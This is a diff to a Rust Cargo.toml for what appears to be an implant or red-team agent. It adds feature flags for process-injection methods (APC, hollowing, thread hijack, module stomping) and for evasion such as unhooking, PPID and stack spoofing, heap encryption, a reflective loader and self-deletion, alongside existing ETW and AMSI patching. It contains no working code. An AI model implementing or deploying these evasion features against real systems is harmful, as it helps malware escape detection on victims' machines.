@@ -21,9 +21,24 @@ parent-spoof   = []
 etw-patch      = []
 amsi-patch     = []
 
+# Phase 3 injection techniques
+inject-classic = []
+inject-apc     = []
+inject-hollow  = []
+inject-hijack  = []
+inject-stomp   = []
+unhook         = []
+ppid-spoof     = []
+heap-encrypt   = []
+stack-spoof    = []
+udrl           = []
+staged-payload = []
+self-delete    = []
+
 [dependencies]
 # Crypto
 aes-gcm    = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
+chacha20   = { version = "0.9", default-features = false }
 p256       = { version = "0.13", default-features = false, features = ["ecdh"] }
 rand       = { version = "0.8", default-features = false, features = ["getrandom"] }
 sha2       = { version = "0.10", default-features = false }
@@ -61,6 +76,9 @@ windows-sys = { version = "0.52", features = [
     "Win32_UI_WindowsAndMessaging",
     "Win32_Storage_FileSystem",
     "Win32_System_Pipes",
+    "Win32_System_ProcessStatus",
+    "Win32_System_IO",
+    "Win32_System_Kernel",
 ] }
 
 [profile.release]
